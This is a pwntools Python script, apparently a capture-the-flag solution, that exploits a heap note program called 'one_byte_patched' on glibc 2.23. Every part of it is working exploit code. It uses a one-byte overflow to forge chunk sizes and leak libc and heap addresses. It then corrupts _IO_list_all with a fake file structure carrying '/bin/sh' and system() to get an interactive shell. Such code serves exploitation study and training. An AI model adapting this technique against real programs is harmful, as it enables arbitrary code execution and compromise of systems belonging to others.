#!/usr/bin/env python3

from pwn import *

exe = ELF("./one_byte_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe

index = 0

gs = """
b *main
b *main+244
b *main+311
b *main+415
b *main+480
b *main+560
b *main+652
b *main+713
b *main+788
"""

def info(mes):
    return log.info(mes)

def start():
    if args.GDB:
        return gdb.debug(exe.path, gdbscript=gs)
    elif args.remote:
        return remote('', )
    else:
        return process(exe.path)

def malloc():
    global index
    p.sendline(b'1')
    p.recvuntil(b'> ')
    index += 1
    return index - 1
    
def free(index):
    p.sendline(b'2')
    p.sendlineafter(b'index: ', str(index).encode())
    p.recvuntil(b'> ')

def edit(index, data):
    p.sendline(b'3')
    p.sendlineafter(b'index: ', str(index).encode())
    p.sendlineafter(b'data: ', data)
    p.recvuntil(b'> ')

def read(index):
    p.sendline(b'4')
    p.sendlineafter(b'index: ', str(index).encode())
    output = p.recv(0x58)
    p.recvuntil(b'> ')
    return output

def quit():
    p.sendline(b'5')
    
p = start()
p.recvuntil(b'> ')
chunk_A = malloc()
chunk_B = malloc()
chunk_C = malloc()
chunk_D = malloc()
chunk_E = malloc()

###leak libc####
edit(chunk_A, p8(0)*0x58 + p8(0xc1))
free(chunk_B)

chunk_B2 = malloc()
libc_leak = read(chunk_C)
libc.address = u64(libc_leak[0:8]) - 0x399b78
log.info(f"libc address: {hex(libc.address)}")

###leak heap####
input()
chunk_C2 = malloc()
free(chunk_A)
free(chunk_C2)

fastbin_data = read(chunk_C)
heap = u64(fastbin_data[0:8])
log.info(f"heap: {hex(heap)}")

### get shell ###
chunk_C3 = malloc()
chunk_A2 = malloc()

edit(chunk_A2,p8(0)*0x58 + p8(0xc1))
free(chunk_B2)

chunk_B3 = malloc()

# string "/bin/sh" to _flag size field
edit(chunk_B3, p64(0)*10 + b'/bin/sh\x00' + p8(0x68))
#edit(chunk_B3, p64(0)*10 + b'/bin/sh\x00' + p8(0xb1))
payload = p64(0) + p64(libc.sym['_IO_list_all'] - 0x10) + p64(1) + p64(2) 

edit(chunk_C3, payload)

edit(chunk_E, p64(libc.sym['system']) + p64(heap + 0x178))

p.sendline(b'1')
p.interactive()
